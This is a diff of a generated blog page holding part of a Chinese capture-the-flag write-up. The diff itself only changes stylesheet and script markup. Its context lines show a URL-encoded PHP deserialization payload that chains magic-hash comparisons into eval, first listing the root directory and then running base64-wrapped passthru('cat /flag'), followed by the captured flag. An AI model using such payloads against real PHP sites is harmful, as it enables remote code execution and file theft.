@@ -10,6 +10,8 @@
 <link rel="stylesheet" href="../../css/style.css">
 
   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.17.0/dist/katex.min.css">
+  
 <meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="atom.xml" title="D'b8Gr的小站~" type="application/atom+xml">
 </head>
 <body class="theme-db8gr layout-post">
@@ -90,7 +92,7 @@
 
 <p>得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A22%3A%22print_r%28scandir%28%27%2F%27%29%29%3B%22%3B%7D%7D%7D</code></p>
 <p>先调用类似<code>ls /</code>命令查看文件夹，得到：</p>
-<p><img decoding="async" loading="lazy" src="/images/week4_1.png" alt="week4_1"></p>
+<p><img src="/images/week4_1.png" alt="week4_1"></p>
 <p>然后再用<code>eval()函数，再base64编码</code>，改<code>$mon3tr-&gt;end = &quot;print_r(scandir(&#39;/&#39;));&quot;;</code>为<code>$mon3tr-&gt;end = &quot;eval(base64_decode(&#39;cGFzc3RocnUoJ2NhdCAvZmxhZycpOw==&#39;));&quot;;</code>，执行php代码，得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A56%3A%22eval%28base64_decode%28%27cGFzc3RocnUoJ2NhdCAvZmxhZycpOw%3D%3D%27%29%29%3B%22%3B%7D%7D%7D</code>，</p>
 <p>POST请求，最终得到flag：flag{e24449c0-752e-42fe-8e9a-cff80fe7e221}</p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Week4-Myneighbors"><a href="#Week4-Myneighbors" class="headerlink" title="[Week4] Myneighbors"></a>[Week4] Myneighbors</h3><hr>
@@ -190,6 +192,8 @@
   <span>&copy; 2024-2026 debu8ger</span>
 </footer>
 
-  <script defer src="../../js/main.js"></script>
+  
+<script src="../../js/main.js"></script>
+
 </body>
 </html>
